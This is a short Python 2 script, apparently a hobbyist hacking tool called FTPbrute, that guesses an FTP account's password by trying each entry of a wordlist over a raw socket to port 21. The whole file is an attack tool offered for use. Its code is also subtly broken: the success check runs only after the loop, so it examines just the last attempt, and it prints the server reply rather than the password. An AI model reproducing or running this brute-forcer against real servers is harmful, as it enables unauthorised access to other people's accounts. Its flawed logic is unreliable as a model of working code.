#!/usr/bin/python
import socket
import re
import sys

def usage():
	print " ____        _         _   _      ____  "
	print "| __ )  ___ | | ___ __| \ | |_ __| __ ) "
	print "|  _ \ / _ \| |/ / '__|  \| | '__|  _ \ "
	print "| |_) | (_) |   <| |  | |\  | |  | |_) |"
	print "|____/ \___/|_|\_\_|  |_| \_|_|  |____/ "
	print " "
	print " Usage()"	
	print "python FTPbrute.py [IP] [user] [password list]"
	sys.exit()

def main():
	if not len(sys.argv[2:]):
		usage()
	else:
		brute()
	
def brute():
	user = sys.argv[2]
	file = open(sys.argv[3])
	for line in file.readlines():
		print "Testing...%s:%s" %(user,line)
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((sys.argv[1],21))
		s.recv(1024)
		s.send("USER "+user+"\r\n")
		s.recv(1024)
		s.send("PASS "+line+"\r\n")
		result = s.recv(1024)
		s.send("QUIT\r\n")
	if re.search("230", result):
		print "[+] Got the FTP password: %s [+]"%(result)
	else:
		print "[-] You couldn't crack this shit [-]\n"
	sys.exit()
main()